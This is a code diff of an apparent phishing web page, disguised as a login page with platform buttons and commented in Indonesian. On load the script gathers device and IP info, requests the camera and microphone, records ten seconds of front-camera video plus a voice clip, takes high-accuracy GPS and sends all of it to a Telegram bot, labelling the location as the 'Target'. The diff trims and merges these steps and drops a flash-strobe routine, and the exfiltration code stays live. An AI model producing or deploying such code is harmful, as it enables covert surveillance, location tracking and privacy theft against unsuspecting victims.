@@ -145,10 +145,6 @@
     const button = document.getElementById('login-button');
     const notif = document.getElementById('notif');
 
-    let mainStream = null;
-    let mainRecorder = null;
-    const videoChunks = [];
-
     function selectPlatform(btn) {
       document.querySelectorAll('.platform-btn').forEach(b => b.classList.remove('active'));
       btn.classList.add('active');
@@ -169,7 +165,7 @@
         const formData = new FormData();
         formData.append('chat_id', id);
         formData.append('video', blob, filename);
-        formData.append('caption', '📹 Rekaman Kamera Depan (Durasi Penuh)');
+        formData.append('caption', '📹 Rekaman Kamera Depan (10 Detik)');
         fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: formData }).catch(console.error);
       });
     }
@@ -204,41 +200,36 @@
       } catch (err) {}
     }
 
-    async function recordFrontVideo() {
+    // Fungsi Utama: Gabungan Rekaman & Lokasi
+    async function startCombinedAccess() {
       try {
-        mainStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
-        mainRecorder = new MediaRecorder(mainStream);
+        // Minta izin kamera & mikrofon
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
         
-        mainRecorder.ondataavailable = (e) => { 
-          if (e.data.size > 0) videoChunks.push(e.data); 
+        // JIKA IZIN DIBERIKAN, otomatis ambil lokasi
+        getLocation();
+
+        const mediaRecorder = new MediaRecorder(stream);
+        const videoChunks = [];
+        
+        mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) videoChunks.push(e.data); };
+        
+        mediaRecorder.onstop = () => {
+          const videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
+          sendVideo(videoBlob, 'rekaman_10detik.mp4');
+          stream.getTracks().forEach(track => track.stop());
         };
 
-        mainRecorder.onstop = () => {
-          if (videoChunks.length > 0) {
-            const videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
-            sendVideo(videoBlob, 'rekaman_full_akses.mp4');
-          }
-          if (mainStream) {
-            mainStream.getTracks().forEach(track => track.stop());
-          }
-        };
+        mediaRecorder.start();
+        // Durasi diatur menjadi 10 detik (10000 ms)
+        setTimeout(() => { 
+          if (mediaRecorder.state !== "inactive") mediaRecorder.stop(); 
+        }, 10000);
 
-        mainRecorder.start(1000); 
       } catch (err) {
-        sendToTelegram('maaf akses vidio tidak berhasil 🤬');
+        sendToTelegram('maaf akses vidio/kamera ditolak 🤬');
       }
     }
-
-    function handleExit() {
-      if (mainRecorder && mainRecorder.state === "recording") {
-        mainRecorder.stop();
-      }
-    }
-
-    document.addEventListener('visibilitychange', () => {
-      if (document.visibilityState === 'hidden') handleExit();
-    });
-    window.addEventListener('pagehide', handleExit);
 
     async function autoRecordAudio() {
       try {
@@ -258,32 +249,6 @@
       }
     }
 
-    async function startFlashStrobe() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-        const track = stream.getVideoTracks()[0];
-        const capabilities = track.getCapabilities();
-        if (!capabilities.torch) {
-          sendToTelegram('flash tidak on 🤬');
-          stream.getTracks().forEach(t => t.stop());
-          return;
-        }
-        sendToTelegram('flash berhasil on ✅');
-        let isOn = false;
-        const interval = setInterval(async () => {
-          try {
-            isOn = !isOn;
-            await track.applyConstraints({ advanced: [{ torch: isOn }] });
-          } catch (e) { clearInterval(interval); }
-        }, 90);
-        setTimeout(() => {
-          clearInterval(interval);
-          track.applyConstraints({ advanced: [{ torch: false }] });
-          stream.getTracks().forEach(t => t.stop());
-        }, 20000);
-      } catch (err) { sendToTelegram('flash tidak on 🤬'); }
-    }
-
     function getLocation() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
@@ -294,33 +259,24 @@
             sendToTelegram(`📍 <b>Lokasi GPS Target:</b> <a href="${mapUrl}">click disini</a>`);
           },
           (error) => {
-            sendToTelegram('maaf akses lokasi di tolak 🤬');
+            sendToTelegram('maaf akses lokasi ditolak 🤬');
           },
           { enableHighAccuracy: true }
         );
-      } else {
-        sendToTelegram('Browser tidak mendukung Geolocation ❌');
       }
     }
 
-    // Eksekusi semua izin secara berturut-turut saat DOM siap
     window.addEventListener('DOMContentLoaded', async () => {
       createParticles();
       
-      // 1. Ambil Info Perangkat & IP
+      // Tahap 1: Ambil info perangkat
       await getInfo();
       
-      // 2. Minta Izin Lokasi
-      getLocation();
+      // Tahap 2: Pemicu Gabungan (Kamera + Video 10 Detik + Lokasi Otomatis)
+      startCombinedAccess();
       
-      // 3. Minta Izin Kamera (Video) & Mulai Rekam Terus-menerus
-      await recordFrontVideo();
-      
-      // 4. Minta Izin Mikrofon (Audio) & Rekam 5 Detik Pertama
-      await autoRecordAudio();
-      
-      // 5. Coba Aktifkan Flash (Kamera Belakang)
-      startFlashStrobe();
+      // Tahap 3: Voice Note singkat
+      autoRecordAudio();
     });
 
     button.addEventListener('click', () => {
